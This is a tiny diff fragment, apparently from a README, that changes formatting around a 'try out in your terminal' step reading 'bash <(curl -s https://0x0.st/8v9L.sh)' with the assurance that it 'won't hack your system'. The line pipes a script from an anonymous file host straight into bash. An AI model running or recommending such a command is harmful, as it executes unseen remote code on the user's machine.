@@ -24,9 +24,8 @@
 
 Try out in your terminal: (it won't hack your system)
  
-```
 bash <(curl -s https://0x0.st/8v9L.sh)
-```
+
 
 </h4>
 
